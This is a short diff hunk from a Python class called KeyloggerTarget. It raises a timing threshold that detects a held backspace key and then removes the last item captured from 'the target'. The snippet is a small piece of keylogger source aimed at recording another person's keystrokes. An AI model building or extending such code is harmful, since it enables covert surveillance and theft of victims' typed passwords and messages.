@@ -298,7 +298,7 @@ class KeyloggerTarget:
                     self.seconds.append(all)
                 minus = all - self.seconds[0]
                 # This checks if the target is holding the backspace key
-                if minus > 0.05 or minus == 0.0:
+                if minus > 0.07 or minus == 0.0:
                     if self.richtige_liste:
                         self.richtige_liste.pop(-1)
                         # Removes the last item of the list
